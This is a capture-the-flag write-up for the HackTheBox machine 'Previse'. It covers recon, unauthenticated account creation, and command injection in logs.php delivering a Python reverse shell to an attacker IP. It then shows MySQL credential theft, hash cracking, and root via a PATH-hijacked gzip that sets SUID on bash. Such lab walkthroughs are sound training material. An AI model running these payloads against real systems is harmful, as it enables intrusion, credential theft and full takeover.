# HACKTHEBOX: Previse

Any unauthenticated attacker can create an account, retrieve a MySQL database password, and exploit remote code execution in the *Previse* web application. After gaining access to the system, credentials in the MySQL database can be used to gain access to a user who can run a shell script as root.

## Recon and Enumeration

Running an `nmap` scan shows there is an HTTP server on port 80
```
# Nmap 7.80 scan initiated Wed Sep 22 22:28:34 2021 as: nmap -A --min-rate 4000 -oA previse 10.10.11.104
Nmap scan report for 10.10.11.104
Host is up (0.060s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 22 22:28:44 2021 -- 1 IP address (1 host up) scanned in 10.06 seconds
```

Visiting the box in a web browser brings the visitor to `http://10.10.11.104/login.php`. Running a Gobuster scan with a *php* extension gives the following results.
```
$ gobuster dir -x php --url 10.10.11.104 --wordlist /usr/share/wordlists/directories.txt -o previse_php.gobuster

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.104
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/09/22 22:35:07 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 302) [Size: 2801] [--> login.php]
/download.php         (Status: 302) [Size: 0] [--> login.php]   
/login.php            (Status: 200) [Size: 2224]                
/files.php            (Status: 302) [Size: 4914] [--> login.php]
/header.php           (Status: 200) [Size: 980]                 
/nav.php              (Status: 200) [Size: 1248]                
/footer.php           (Status: 200) [Size: 217]                 
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.104/css/]
/status.php           (Status: 302) [Size: 2968] [--> login.php]              
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.104/js/] 
/logout.php           (Status: 302) [Size: 0] [--> login.php]                 
/accounts.php         (Status: 302) [Size: 3994] [--> login.php]              
/config.php           (Status: 200) [Size: 0]                                 
/logs.php             (Status: 302) [Size: 0] [--> login.php]
```

Any unauthenticated user can send the following post request to `http://10.10.11.104/accounts.php` in order to create an account. In this request, a user is created with credentials `carlos:helloworld`
```
POST /accounts.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: http://10.10.11.104
DNT: 1
Connection: close
Referer: http://10.10.11.104/login.php
Cookie: PHPSESSID=i14lq0oj38pm4s2ktiqrlrdh4j
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=carlos&password=helloworld&confirm=helloworld
```

After authenticating with `carlos:helloworld` and visiting `http://10.10.11.104/files.php` the attacker can download a copy of the source code titled `siteBackup.zip`. Dangerous *php* functions can be searched. The following snippet of source code comes from `logs.php`.
```
/////////////////////////////////////////////////////////////////////////////////////
//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
/////////////////////////////////////////////////////////////////////////////////////

$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;
```

## Exploitation and user.txt
Running `nc -lvnp 8888` starts a netcat listener. Sending the following post request to `logs.php` abuses remote code execution to gain a reverse shell.
```
POST /logs.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 230
Origin: http://10.10.11.104
DNT: 1
Connection: close
Referer: http://10.10.11.104/file_logs.php
Cookie: PHPSESSID=i14lq0oj38pm4s2ktiqrlrdh4j
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

delim=comma; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.95",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

MySQL credentials are discovered in `config.php`
```
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
```

Use the reverse shell access and MySQL credentials to view the MySQL database.
```
$ mysql -u root -p
Enter password: mySQL_p@ssw0rd!:)

mysql> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| previse            |
| sys                |
+--------------------+

mysql> USE previse;
mysql> SHOW TABLES;
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+

mysql> SELECT * FROM accounts;
+----+-------------+------------------------------------+---------------------+
| id | username    | password                           | created_at          |
+----+-------------+------------------------------------+---------------------+
|  1 | m4lwhere    | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | carlos      | $1$🧂llol$8kATL8vlfBaLb21HUSqDc. | 2021-09-23 06:22:21 |
+----+-------------+------------------------------------+---------------------+
```

Cracking the password for the user `m4lwhere` can be accomplished with `hashcat` using the `rockyou.txt` wordlist.
```
$ echo '$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.' > hash.txt
$ hashcat -a 0 -m 500 hash.txt /usr/share/wordlists/rockyou.txt --force
```

Hashcat cracks the hash, with the password `ilovecody112235!`. Back in the reverse shell, log in with the credentials `m4lwhere:ilovecody112235!` and capture **user.txt**.
```
www-data@previse:/var/www/html$ su m4lwhere
Password: ilovecody112235!

m4lwhere@previse:/var/www/html$ cd  
m4lwhere@previse:~$ ls -l
total 4
-r-------- 1 m4lwhere m4lwhere 33 Sep 23 04:31 user.txt
m4lwhere@previse:~$
```

## Privilege Escalation and root.txt
Running `sudo -l` lists the commands the user is allowed to run as root.
```
m4lwhere@previse:~$ sudo -l
[sudo] password for m4lwhere: ilovecody112235!

User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
m4lwhere@previse:~$
```

Examine the contents of `/opt/scripts/access_backup.sh`
```
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

This script calls `gzip` using the relative path, rather than the absolute path of `/bin/gzip`. Create the script `/home/m4lwhere/scripts/gzip` to set the suid execute bit on /bin/bash to allow user m4lwhere to run `/bin/bash` as root:
```
#!/bin/bash
chmod +sx /bin/bash
```

Add the directory `/home/m4lwhere/scripts` to path to abuse the relative path call in `/opt/scripts/access_backup.sh`.
```
chmod +x /home/m4lwhere/script/gzip
export PATH=/home/m4lwhere/scripts:$PATH
```

Finally, escalate privileges.
```
m4lwhere@previse:~/scripts$ sudo /opt/scripts/access_backup.sh
m4lwhere@previse:~/scripts$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash
m4lwhere@previse:~/scripts$ /bin/bash -p
bash-4.4# whoami
root
bash-4.4# id
uid=1000(m4lwhere) gid=1000(m4lwhere) euid=0(root) egid=0(root) groups=0(root),1000(m4lwhere)
bash-4.4# cd /root     
bash-4.4# ls -l
total 4
-r-------- 1 root root 33 Sep 23 04:31 root.txt
bash-4.4#
```
